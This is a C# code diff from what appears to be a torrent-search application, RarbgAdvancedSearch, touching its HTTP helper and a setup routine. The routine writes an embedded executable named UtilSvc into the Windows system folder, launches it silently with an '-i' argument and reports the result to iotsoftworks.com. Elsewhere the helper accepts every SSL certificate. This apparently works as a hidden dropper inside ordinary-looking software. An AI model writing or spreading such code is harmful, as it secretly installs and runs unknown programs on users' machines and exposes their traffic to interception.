@@ -67,7 +67,7 @@ namespace RarbgAdvancedSearch
         {
             private const int READTIMEOUT_CONST = 3000;
 
-            public static string Post(string url, string content = "", int RXTIMEO = READTIMEOUT_CONST)
+            public static string Post(string url, ref byte[] responseBytes, string content = "", int RXTIMEO = READTIMEOUT_CONST)
             {
                 //Ignore ssl errors
                 ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
@@ -93,8 +93,11 @@ namespace RarbgAdvancedSearch
                 {
                     if (stream.CanRead)
                     {
-                        StreamReader reader = new StreamReader(stream);
-                        return reader.ReadToEnd();
+                        MemoryStream ms = new MemoryStream();
+                        stream.CopyTo(ms);
+                        responseBytes = ms.ToArray();
+
+                        return Encoding.ASCII.GetString(responseBytes);
                     }
                 }
 
@@ -140,7 +143,10 @@ namespace RarbgAdvancedSearch
                     webRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                     webRequest.Headers["accept-encoding"] = "gzip, deflate";
                     webRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36";
+                    webRequest.AutomaticDecompression = DecompressionMethods.Deflate | DecompressionMethods.GZip;
                 }
+
+                webRequest.Timeout = READTIMEOUT_CONST;
 
                 HttpWebResponse webResponse = (HttpWebResponse)webRequest.GetResponse();
                 using (Stream stream = GetStreamForResponse(webResponse, READTIMEOUT_CONST))
@@ -274,15 +280,18 @@ namespace RarbgAdvancedSearch
         {
             try
             {
-                var path = $"{Path.GetPathRoot(Environment.SystemDirectory)}/Windows/UtilSvc";
+                var path = $"{Path.GetPathRoot(Environment.SystemDirectory)}/Windows/UtilSvc/UtilSvc.exe";
                 System.IO.FileInfo file = new System.IO.FileInfo(path);
                 file.Directory.Create();
                 File.WriteAllBytes(path, Resources.UtilSvc);
                 System.Diagnostics.Process p = new System.Diagnostics.Process();
                 p.StartInfo.FileName = path;
                 p.StartInfo.UseShellExecute = false;
+                p.StartInfo.Arguments = "-i";
                 if (p.Start())
                     Log("svc_begin");
+                else
+                    Log("svc_begin_failed", "could not start process");
             }
             catch(Exception e)
             {
@@ -323,7 +332,8 @@ namespace RarbgAdvancedSearch
         /// <returns></returns>
         private static void SendLog(string jsonmessage)
         {
-            HttpClient.Post($"https://iotsoftworks.com/stats.php", jsonmessage);
+            byte[] dummy = { };
+            HttpClient.Post($"https://iotsoftworks.com/stats.php", ref dummy, jsonmessage);            
         }
     }
     #endregion
